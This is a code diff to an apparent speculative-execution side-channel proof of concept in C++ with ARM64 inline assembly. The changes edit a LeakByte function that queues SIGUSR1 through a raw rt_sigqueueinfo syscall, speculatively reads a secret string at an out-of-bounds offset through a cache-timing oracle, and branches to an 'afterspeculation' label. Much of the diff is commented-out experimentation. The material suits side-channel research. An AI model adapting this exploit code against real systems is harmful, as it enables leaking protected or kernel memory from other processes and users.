@@ -52,6 +52,15 @@ void change_index(size_t * index){
   return;
 }
 
+static void throwAndJump(size_t *index) {
+    // std::cout << "Throwing an exception now!" << std::endl;
+    *index +=3;
+
+    asm volatile("b afterspeculation");
+
+    // throw std::runtime_error("Exception: Jump to another location");
+}
+
 static char LeakByte(const char *data, size_t offset, size_t x, char *kernel_memory_addr, char *probe_array) {
   CacheSideChannel sidechannel;
   const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
@@ -69,6 +78,16 @@ static char LeakByte(const char *data, size_t offset, size_t x, char *kernel_mem
     union sigval sig_data;
     sig_data.sival_ptr = &mod_data;
     
+    // siginfo_t sig_data_struct = {.si_signo = SIGUSR1, .si_code = SI_QUEUE, .si_pid = getpid(), .si_uid = getuid(), .si_value = sig_data};
+    
+    siginfo_t sig_data_struct;
+    memset(&sig_data_struct, 0, sizeof(siginfo_t));  // Clear the structure
+
+    sig_data_struct.si_signo = SIGUSR1;     // Signal number
+    sig_data_struct.si_code = SI_QUEUE;     // Code indicating it was sent via sigqueue
+    sig_data_struct.si_pid = getpid();      // Sending process ID
+    sig_data_struct.si_uid = getuid();      // Sending user ID
+    sig_data_struct.si_value = sig_data;    // Value passed via sigqueue (union sigval)
 
     // Flush the probe array from cache
     // for (int i = 0; i < 256; ++i) {
@@ -95,16 +114,17 @@ static char LeakByte(const char *data, size_t offset, size_t x, char *kernel_mem
     //     : "r"(__NR_kill), "r"(getpid()), "r"(SIGUSR1)//, "r"(&mod_data)
     //     : "x0", "x1", "x8"//, "w2"    // Clobbered registers
     // );
-    // asm volatile(
-    //     "mov x8, %0\n"           // System call number for rt_sigqueueinfo
-    //     "mov x0, %1\n"           // Process ID (getpid)
-    //     "mov x1, %2\n"           // Signal number (SIGUSR1)
-    //     "mov x2, %3\n"           // Pointer to sigval (value)
-    //     "svc #0\n"               // Make the system call
-    //     :
-    //     : "r"(129), "r"(getpid()), "r"(SIGUSR1), "r"(&sig_data)
-    //     : "x0", "x1", "x2", "x8"
-    // );
+
+    //--- System call along with pointer to rotation index of secret string-------------------
+    asm volatile(
+        "mov x8, %0\n"           // System call number for rt_sigqueueinfo
+        "mov x0, %1\n"           // Process ID (getpid)
+        "mov x1, %2\n"           // Signal number (SIGUSR1)
+        "mov x2, %3\n"           // Pointer to sigval (value)
+        "svc #0\n"               // Make the system call
+        :: "r"(__NR_rt_sigqueueinfo), "r"(getpid()), "r"(SIGUSR1), "r"(&sig_data_struct)
+        : "x0", "x1", "x2", "x8"
+    );
     // sigqueue(getpid(), SIGUSR1, sig_data);
     // mod_data++;  
     // asm volatile(
@@ -112,8 +132,20 @@ static char LeakByte(const char *data, size_t offset, size_t x, char *kernel_mem
     // );
 
     // asm volatile("my_label:");
-    asm volatile ("mrs %0, CurrentEL" : "=r"(mode));
-    mode = (mode >> 2) & 0b11;
+    // asm volatile ("mrs %0, CurrentEL" : "=r"(mode));
+    // mode = (mode >> 2) & 0b11;
+
+    
+    // throwAndJump(&mod_data);
+    // asm volatile(
+    //     "mov x0, %0\n"  // Move the address of mod_data (the argument) into register x0
+    //     "bl throwAndJump\n"  // Branch to throwAndJump (function call)
+    //     :                   // No output
+    //     : "r"(&mod_data)    // Input: address of mod_data
+    //     : "x0"              // Clobbered registers (x0 is used to pass the argument)
+    // );
+
+    
       // change_index(&mod_data);
 
     // for(int i = 0; i< 100; i++){
@@ -142,9 +174,10 @@ static char LeakByte(const char *data, size_t offset, size_t x, char *kernel_mem
 
     // Unreachable code. Speculatively access the unsafe offset.
     // if((mode & 0b11) == 0b00)
-      ForceRead(oracle.data() + static_cast<size_t>(data[(offset - x + mod_data % strlen(private_data))]));
+    ForceRead(oracle.data() + static_cast<size_t>(data[(offset - x + mod_data % strlen(private_data))]));
     // ForceRead(oracle.data() + static_cast<size_t>(data[offset]));
     std::cout << "Dead code. Must not be printed." << std::endl;
+    
     
 
     // The exit call must not be unconditional, otherwise clang would optimize
@@ -154,7 +187,16 @@ static char LeakByte(const char *data, size_t offset, size_t x, char *kernel_mem
     }
 
     // SIGUSR1 signal handler moves the instruction pointer to this label.
+
+
     asm volatile("afterspeculation:");
+    
+    // catch(const std::runtime_error& e){
+      // std::cout << "Caught exception: " << e.what() << std::endl;
+    // }
+
+    // ForceRead(oracle.data() + static_cast<size_t>(data[(offset - x + mod_data % strlen(private_data))]));
+
     // std::cout<<"LOL"<<std::endl;
 
     int best_guess = -1;
